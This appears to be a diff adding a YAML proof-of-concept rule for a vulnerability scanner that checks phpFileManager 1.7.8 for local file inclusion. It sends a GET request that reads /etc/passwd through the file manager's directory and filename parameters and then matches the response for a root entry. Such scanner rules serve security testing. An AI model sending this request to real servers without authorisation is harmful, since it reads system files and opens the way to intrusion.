@@ -1,0 +1,13 @@
+name: poc-yaml-phpfilemanagefr-lfi.yml
+
+rules:
+  - method: GET
+    path: /index.php?action=3&fm_current_dir=%2Fetc%2F&filename=passwd
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  vulnType: phpFileManager 1.7.8 - Local File Inclusion
+  author: supersalted(https://github.com/salted)
+  links:
+   -https://www.exploit-db.com/exploits/46638
